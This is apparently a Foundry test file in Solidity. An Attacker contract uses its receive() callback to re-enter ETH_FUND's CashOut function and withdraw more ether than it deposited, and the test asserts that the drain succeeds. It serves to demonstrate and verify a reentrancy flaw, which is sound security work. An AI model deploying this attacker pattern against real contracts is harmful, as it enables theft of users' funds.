
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND, Log} from "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_FUND(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Initial deposit from attacker into the fund
        vm.prank(address(_attacker));
        _contractUnderTest.Deposit{value: attackVal}();

        // Move to next block so CashOut condition passes
        vm.roll(block.number + 1);

        _attacker.setupAttack{value: 0}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) {
        victim = ETH_FUND(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedVal = val;

        // Trigger vulnerable CashOut
        victim.CashOut(val);

        // After reentrancy, check if we drained more than our initial balance
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter with the same amount to exploit lack of state update before external call
            victim.CashOut(storedVal);
        }
    }
}
